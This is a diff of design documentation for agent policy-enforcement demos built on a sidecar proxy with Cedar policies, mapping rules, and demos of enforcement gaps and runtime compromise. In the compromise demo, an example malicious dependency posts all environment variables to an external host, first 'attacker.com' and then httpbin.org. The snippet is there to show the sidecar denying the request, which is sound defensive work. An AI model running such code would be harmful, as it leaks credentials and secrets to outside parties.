@@ -19,18 +19,24 @@ Self-contained execution environment for agent policy demos. Visualizes how tool
 examples/
 └── demos/
     ├── run.sh                   # Direct terminal runner, no TUI
+    ├── agent/                   # Shared Python agent module
+    │   ├── __init__.py
+    │   └── tools/
     ├── demo0/                   # Fragmented enforcement across four systems
     │   ├── authority.toml
     │   ├── sidecar.toml
     │   ├── mapping-rules.toml
-    │   ├── policy.cedar
+    │   ├── description.md
     │   ├── agent.py
     │   ├── agent_prompt.md
-    │   └── description.md
+    │   └── policies/
+    │       └── policy.cedar
     │
     ├── demo1/                   # Path-level enforcement on the same host
     └── demo2/                   # Runtime enforcement under compromise
 ```
+
+Each demo's runtime state (keys, CA cert, audit log) is written to `demoX/.runtime/` and is `.gitignore`d.
 
 ---
 
@@ -49,7 +55,7 @@ From `examples/demos/demoX/`:
 - `authority.toml`
 - `sidecar.toml`
 - `mapping-rules.toml`
-- `policy.cedar`
+- `policies/policy.cedar`
 - `agent.py`
 - `agent_prompt.md`
 - `description.md`
@@ -86,9 +92,9 @@ Each demo provides `demoX/authority.toml` which maps directly to `AuthorityConfi
 
 ```toml
 listen_addr        = "127.0.0.1:50051"
-policy_dir         = "examples/demos/demo0"
-revocation_file    = "examples/demos/demo0/revocations.txt"
-key_file           = "examples/demos/demo0/authority.key"
+policy_dir         = "examples/demos/demo0/policies"   # note: policies/ subdir
+revocation_file    = "examples/demos/demo0/.runtime/revocations.txt"
+key_file           = "examples/demos/demo0/.runtime/authority.key"
 max_ttl_seconds    = 3600
 bundle_ttl_seconds = 30
 log_level          = "info"
@@ -101,29 +107,63 @@ Config resolution order (highest to lowest priority):
 2. `demoX/authority.toml`
 3. `AuthorityConfig` defaults
 
-Each demo is a **self-contained policy universe** — `policy_dir` points into the demo directory.
+Each demo is a **self-contained policy universe** — `policy_dir` points into the demo's `policies/` subdirectory.
 
 ---
 
 ## Sidecar Config (per demo)
 
-`demoX/sidecar.toml` mirrors the existing `examples/e2e/sidecar.toml` shape. Key fields:
+`demoX/sidecar.toml` mirrors the existing `examples/e2e/sidecar.toml` shape:
 
 ```toml
 [interceptor]
-mode        = "http_proxy"
-listen_addr = "127.0.0.1:8080"
+mode               = "http_proxy"
+listen_addr        = "127.0.0.1:8080"
+drain_timeout_secs = 30
 
 [policy]
+dir           = "examples/demos/demo0"
 authority_url = "http://127.0.0.1:50051"
+
+[ca]
+dir = "examples/demos/demo0/.runtime/generated-firma-ca"
+
+[log]
+level = "info"
 
 [mapping]
 rules_path        = "examples/demos/demo0/mapping-rules.toml"
 default_protected = true   # demos default to fail-closed
 
+[capability_validation]
+clock_skew_tolerance_seconds = 0
+
+[constraint_enforcement]
+bundle_ttl_seconds     = 3600
+enforcement_timeout_ms = 50
+
+[connector]
+default_timeout_ms = 10000
+
 [audit]
-sink      = "file"
-file_path = "examples/demos/demo0/.runtime/audit.jsonl"
+sink             = "file"
+file_path        = "examples/demos/demo0/.runtime/audit.jsonl"
+signing_key_path = "examples/demos/demo0/.runtime/audit.key"
+
+[authority]
+connect_timeout_secs                 = 10
+reconnect_min_backoff_ms             = 250
+reconnect_max_backoff_secs           = 30
+revocation_readiness_grace_ms        = 500
+revocation_fail_closed_on_disconnect = false
+
+[preflight]
+agent_id               = "demo0-agent"
+session_id             = "demo0-session-001"
+requested_actions      = ["code.review.read", "filesystem.read"]
+resource_scope         = "*"
+authority_pub_key_path = "examples/demos/demo0/.runtime/authority.pub"
+ttl_seconds            = 3600
 ```
 
 `default_protected = true` is the demo default — every unmapped host is DENY.
@@ -132,18 +172,20 @@ file_path = "examples/demos/demo0/.runtime/audit.jsonl"
 
 ## Mapping Rules (per demo)
 
-`demoX/mapping-rules.toml` collapses tool names into the 27-class canonical action registry:
+`demoX/mapping-rules.toml` collapses HTTP method + host + path tuples into the 27-class canonical action registry:
 
 ```toml
 [[rules]]
 method       = "GET"
 host         = "api.github.com"
-action_class = "code.review"
+path         = "/repos/*/*/pulls/*"
+action_class = "code.review.read"
 
 [[rules]]
-method       = "POST"
-host         = "mail.google.com"
-action_class = "communication.external.send"
+method       = "PUT"
+host         = "api.github.com"
+path         = "/repos/*/*/pulls/*/merge"
+action_class = "code.merge"
 
 [[rules]]
 method       = "POST"
@@ -153,12 +195,36 @@ action_class = "payment.transfer"
 
 [[rules]]
 method       = "DELETE"
-host         = "api.internal"
-path         = "/users/*"
+host         = "httpbin.org"
+path         = "/delete"
 action_class = "account.permission.change"
 ```
 
-All tools collapse into a single policy space regardless of provider.
+All tools collapse into a single policy space regardless of provider. Public services (`httpbin.org`) stand in for internal APIs in the OSS demos.
+
+---
+
+## Cedar Policy (per demo)
+
+`demoX/policies/policy.cedar` — evaluated by the sidecar on every outbound call.
+
+```cedar
+// Demo 0 example: read-only agent.
+// Only code.review.read and filesystem.read are permitted.
+
+permit (
+    principal == Firma::Agent::"demo0-agent",
+    action == Firma::Action::"code.review.read",
+    resource
+);
+
+permit (
+    principal == Firma::Agent::"demo0-agent",
+    action == Firma::Action::"filesystem.read",
+    resource
+);
+// Everything else: default deny.
+```
 
 ---
 
@@ -171,44 +237,44 @@ Key rules:
 - No restrictions in Python code
 - No awareness of which calls will be blocked
 - Prompt injected from `agent_prompt.md` at spawn time
+- Traffic routed through `HTTP_PROXY=http://127.0.0.1:8080`
 
 ---
 
 ## description.md (primary entrypoint)
 
-Shown first in the TUI before execution begins. Replaces scenario scripting.
+Shown first in the TUI before execution begins.
 
 ```md
 # Demo 0 — Same Rule, Four Systems, One Failure
 
-This demo shows how enforcement fragmented across multiple systems
-produces a guaranteed gap.
+Fragmentation of enforcement across tools and layers.
 
-Expected outcome:
-  A backend DELETE request succeeds even though policy forbids it.
+## The point
 
-Key insight:
-  There is no single enforcement point.
+...
 ```
 
 ---
 
-## Boot Flow
+## Boot Flow (run.sh)
 
 ```text
-firma-demo-tui start --demo demo0
+./examples/demos/run.sh demo0
   ↓
-load demo0/
+build binaries (cargo build -p firma-authority -p firma-sidecar)
   ↓
-display description.md
+prepare .runtime/ (mkdir, touch revocations, generate authority key if absent)
   ↓
 start authority (demo0/authority.toml)
   ↓
 start sidecar  (demo0/sidecar.toml)
   ↓
-spawn Python agent (demo0/agent.py, inject demo0/agent_prompt.md)
+wait for CA cert at demo0/.runtime/generated-firma-ca/firma-ca.crt
   ↓
-render TUI
+spawn Python agent (uv run demo0/agent.py)
+  HTTP_PROXY=http://127.0.0.1:8080
+  SSL_CERT_FILE=.runtime/generated-firma-ca/firma-ca.crt
 ```
 
 ## Runtime Loop
@@ -232,10 +298,10 @@ TUI renders all three panes
 ```text
 <TIME> <ALLOW|DENY> <ACTION_CLASS> <RESOURCE> [<REASON>]
 
-12:00:01 ALLOW code.review                 api.github.com/repos/acme/api/pulls/41
-12:00:02 DENY  communication.external.send mail.google.com/send
+12:00:01 ALLOW code.review.read            api.github.com/repos/acme/api/pulls/41
+12:00:02 DENY  communication.external.send gmail.googleapis.com/gmail/v1/users/.../messages/send
 12:00:03 DENY  payment.transfer            api.stripe.com/v1/refunds
-12:00:04 DENY  account.permission.change   api.internal/users/42
+12:00:04 DENY  account.permission.change   httpbin.org/delete
 ```
 
 ---
@@ -248,6 +314,7 @@ TUI renders all three panes
 4. Sidecar enforces all policy; agent is always fully capable
 5. Mapping rules unify tool semantics across providers
 6. `default_protected = true` — demos fail closed
+7. Public services (`httpbin.org`) stand in for internal APIs in OSS builds
 
 ---
 
@@ -263,16 +330,16 @@ The rule: _"This agent can read data, but cannot perform write or destructive ac
 
 | Service | How it enforces today |
 |---|---|
-| GitHub API | OAuth scope (provider-enforced) |
-| Gmail API | OAuth scope (provider-enforced) |
-| Stripe API | Backend check (app-enforced) |
-| Internal backend API | Code path (app-enforced) |
+| GitHub API | Provider permissions |
+| Gmail API | OAuth scope |
+| Stripe API | Backend check |
+| Internal backend API | Application code paths |
 
 **The moment:**
 
 | Action | Action class | Outcome |
 |---|---|---|
-| Read GitHub PR | `code.review` | Allowed |
+| Read GitHub PR | `code.review.read` | Allowed |
 | Send email | `communication.external.send` | Blocked (OAuth scope) |
 | Create Stripe refund | `payment.transfer` | Blocked (backend check) |
 | DELETE `/users/42` | `account.permission.change` | **Executed — no check** |
@@ -284,15 +351,17 @@ The backend has no enforcement layer. The HTTP DELETE goes through.
 Single Cedar policy evaluated by the sidecar on every outbound call:
 
 ```cedar
-permit (principal, action, resource)
-when {
-    action.type in [
-        "code.review",
-        "web.fetch",
-        "gmail.read",
-        "calendar.read"
-    ]
-};
+permit (
+    principal == Firma::Agent::"demo0-agent",
+    action == Firma::Action::"code.review.read",
+    resource
+);
+
+permit (
+    principal == Firma::Agent::"demo0-agent",
+    action == Firma::Action::"filesystem.read",
+    resource
+);
 // Everything else: default deny.
 ```
 
@@ -310,22 +379,22 @@ Every call to GitHub, Gmail, Stripe, or the backend passes through the sidecar. 
 
 Task: _"Fetch customer activity and summarize usage."_
 
-| Endpoint | Status |
-|---|---|
-| `api.internal/usage` | allowed |
-| `api.internal/billing` | forbidden |
+| Endpoint | Action class | Outcome |
+|---|---|---|
+| `api.internal/usage` (`httpbin.org/get`) | `filesystem.read` | ALLOW |
+| `api.internal/billing` (`httpbin.org/anything/billing`) | `credential.read` | DENY |
 
 Both endpoints: same host, same protocol, same service. Agent has a generic `fetch(url)` tool with no credential requirements and no awareness of path sensitivity.
 
 **The moment:**
 
 ```text
-fetch("https://api.internal/usage?user=123")
+fetch("https://httpbin.org/get?user=123")
   → passes through, response returned
 
-fetch("https://api.internal/billing?user=123")
+fetch("https://httpbin.org/anything/billing?user=123")
   → intercepted at sidecar
-  → policy eval: path not in allowlist
+  → policy eval: credential.read not in permit
   → DENY — no upstream call made
 ```
 
@@ -334,7 +403,7 @@ fetch("https://api.internal/billing?user=123")
 | Approach | What happens |
 |---|---|
 | API gateway / backend | Request reaches application; enforcement depends on code |
-| Network allowlisting (host-level) | Can't distinguish `/usage` from `/billing` |
+| Network allowlisting (host-level) | Can't distinguish `/get` from `/anything/billing` |
 | Firma | Intercepted before execution; path-level policy; uniform across all calls |
 
 **Closing line:** Same host. Same service. Different path. The allowed path executes; the forbidden path is never reached.
@@ -350,16 +419,17 @@ fetch("https://api.internal/billing?user=123")
 Agent task: review PRs, interact with GitHub, access environment data.
 
 ```text
-$ env | grep -i github
 GITHUB_TOKEN=ghp_full_repo_scope_token   # full access: read, write, merge, secrets
 ```
 
 Enforced capability (outside the agent):
 
-```text
-allowed: github.pr.read, github.diff.read, github.comment, github.issue.create
-denied:  github.merge, github.push, github.secret.read, external.network.*
-```
+| Permitted | Denied |
+|---|---|
+| `code.review.read` | `code.merge` |
+| `issue.write` | `code.write` |
+| | `credential.read` |
+| | `communication.external.send` |
 
 Agent does not hold credentials directly. Sidecar injects credentials only after ALLOW.
 
@@ -369,16 +439,16 @@ Phase 1 — Normal:
 
 | Action | Outcome |
 |---|---|
-| Read PR | Allowed |
-| Read diff | Allowed |
-| Comment on PR | Allowed |
-| Create issue | Allowed |
+| Read PR | ALLOW |
+| Read diff | ALLOW |
+| Comment on PR | ALLOW |
+| Create issue | ALLOW |
 
 Phase 2 — Overreach:
 
 ```text
 PUT /repos/acme/api/pulls/41/merge
-  → DENY: action not in capability
+  → DENY: code.merge not in capability
   → credentials not injected, request never sent
 ```
 
@@ -386,18 +456,17 @@ Phase 3 — Compromise (malicious dependency executes):
 
 ```python
 import os, requests
-requests.post("https://attacker.com", json=dict(os.environ))
+requests.post("https://httpbin.org/post", json=dict(os.environ))
 ```
 
-Phase 4-5 — Exfiltration and credential misuse:
+Phase 4 — Exfiltration and credential misuse:
 
 | Action | Outcome |
 |---|---|
-| POST attacker.com | Denied |
-| POST raw IP | Denied |
-| Read GitHub secrets | Denied |
-| Push code | Denied |
-| Delete branch | Denied |
+| POST env vars to external host | DENY (`communication.external.send`) |
+| Read GitHub secrets | DENY (`credential.read`) |
+| Push code | DENY (`code.write`) |
+| Delete branch | DENY (`code.write`) |
 
 **Firma model:**
 
